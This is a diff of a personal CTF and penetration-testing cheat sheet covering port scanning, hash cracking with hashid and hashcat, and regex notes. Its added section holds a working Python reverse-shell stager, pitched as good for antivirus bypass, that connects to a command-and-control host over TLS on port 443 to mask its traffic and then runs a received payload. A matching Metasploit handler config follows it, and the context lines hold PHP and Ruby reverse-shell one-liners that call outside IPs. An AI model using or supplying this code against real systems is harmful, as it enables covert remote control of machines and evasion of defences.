@@ -7,9 +7,10 @@
 ## Machine CTF
 ### Enumeration
 - [ ] Port Scan
-	- [ ] TCP - top1000
-	- [ ] TCP - 65K
+	- [ ] TCP - top1000 - nmap
+	- [ ] TCP - 65K - Rustscan
 	- [ ] UDP
+	- [ ] Repeat this step if you are stuck, some ports might be missed.
 - [ ] Subdomain
 - [ ] VHOST
 - [ ] FUZZ
@@ -99,6 +100,15 @@ git status
 
 gitdumper.sh https://re.com/.git/ .git
 ```
+
+# Hash Decrypting("crack hash")
+- If you get Unknown hashes, DO the following
+	- `hashid <HASH>`![](https://i.imgur.com/F5XulaM.png)
+	- `hashcat -h | grep <Number from the hashid>`![](https://i.imgur.com/skmQp1N.png)
+
+	- Use the Number and crack the hash🗡️
+- Sometimes, search for the programs decrypter
+	- example, if u have got some hash on "hmailserver.ini" try to google about "hmailserver password hash decrypter"
 
 # REMEMBERS
 - To analyze Files
@@ -275,7 +285,38 @@ php -r '$sock=fsockopen("10.10.14.92",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
-
+### Python Reverse shell
+- It is Good for antivirus Bypass
+```python
+import socket   
+import ssl     
+import os  
+import threading  
+import time  
+import zlib  
+import base64  
+import struct  
+c2 = '10.10.10.x' #Command and control server ip/hostname  
+port = 443 #Port to connect to (443 to mask the encrypted traffic as https traffic)  
+context=ssl._create_unverified_context()  
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:  
+    with context.wrap_socket(sock, server_hostname=c2) as ssock:  
+         ssock.connect((c2, port))  
+         sent = struct.unpack('>I',ssock.recv(12000))[0]  
+         payload = ssock.recv(sent)  
+         while len(payload) < sent:  
+            payload += ssock.recv(sent-len(payload))  
+         exec(zlib.decompress(base64.b64decode(payload)), {'s':ssock})
+```
+- Save this in python file and send it to the machinee as a payload.
+- Use the below metasploit rc
+```shell
+use multi/handler  
+set payload python/meterpreter/reverse_tcp_ssl  
+set LPORT 443  
+set LHOST 0.0.0.0  
+run
+```
 ### Ruby Reverse Shell
 
 `ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
@@ -395,7 +436,11 @@ Base91	%zmfv;:YH
 - Simple scan
 	- `rustscan -a IP --ulimit 5000`
 - grepable `-g`
-- 
+
+# Regular Expressions(regex)
+- Additional
+	- `^` is to determine **start**, but if it is in `[ ]` it means **except**
+		- `[^"]` this means, any text except that starts with `"`.
 # Windows Fundamental
 - To find information about windows OS
 ```powershell
